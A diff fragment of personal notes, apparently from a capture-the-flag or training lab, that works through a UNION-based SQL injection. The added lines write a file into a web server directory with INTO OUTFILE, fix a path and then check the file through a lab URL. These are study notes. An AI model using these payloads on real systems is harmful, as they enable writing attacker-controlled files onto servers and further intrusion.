@@ -86,3 +86,13 @@ When I tried backup.username, this was still incorrect.
 I then watched a bit of a youtube vid and tried to use the OUTPUT INTO function to write to the file proof.txt:
 
 >cn' UNION SELECT 1, 'file written successfully!', 3, 4,5 INTO OUTFILE '/dashboard/var/www/html/proof.txt'-- -
+
+This did not work because the dashboard directory should be at the end of the directory path to include proof.txt:
+
+>cn' UNION SELECT 1, 'file written successfully!', 3, 4,5 INTO OUTFILE '/var/www/html/dashboard/proof.txt'-- -
+
+This returned no output, suggesting that we have successfully written to the file.
+
+I then checked by including /var/www/html/dashboard/proof.txt at the end of my working URL for the site:
+
+>/http://94.237.58.135:59758/dashboard/dashboard.php
